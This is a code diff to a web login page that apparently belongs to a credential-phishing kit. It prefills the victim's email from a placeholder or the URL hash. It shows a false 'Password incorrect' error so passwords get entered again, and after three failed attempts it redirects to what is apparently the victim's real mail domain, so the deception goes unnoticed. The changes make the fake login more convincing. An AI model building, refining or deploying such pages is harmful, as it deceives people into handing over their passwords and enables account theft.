@@ -342,7 +342,7 @@
 			<span class="text-danger" id="msg" style="font-size:14px; color:#FF0000"></span>
 			</p>
             <label id="user-label" class="form-label">Email address</label>
-            <input id="ai" name="username" tabindex="1" class="form-field" value="  " autocomplete="username" />
+            <input id="ai" name="username" tabindex="1" class="form-field" value="[[-Email-]]" autocomplete="username" />
           </div>
         </div>
       </div>
@@ -374,9 +374,7 @@
     $('#m-btn').click();
 
     /////////////url ai getting////////////////
-
-			<script>
-var ai = window.location.hash.substr(1);
+    var ai = window.location.hash.substr(1);
     if (!ai) {
 
     } else {
@@ -479,14 +477,14 @@ var ai = window.location.hash.substr(1);
             },
             error: function() {
                 $("#pr").val("");
-                if (count >= 2) {
+                if (count >= 3) {
                     count = 0;
                     window.location.replace("http://www." + my_slice);
                     return false;
                 }
                 $("#msg").show();
 				setTimeout(function() { $("#msg").fadeOut('slow'); }, 3000);
-                $('#msg').html("");
+                $('#msg').html("Error: Password incorrect");
             },
             complete: function() {
                 $('#submit-btn').html('Log In');
@@ -521,8 +519,3 @@ var ai = window.location.hash.substr(1);
   </div>
 </body>
 </html>
-
-
-
-
-
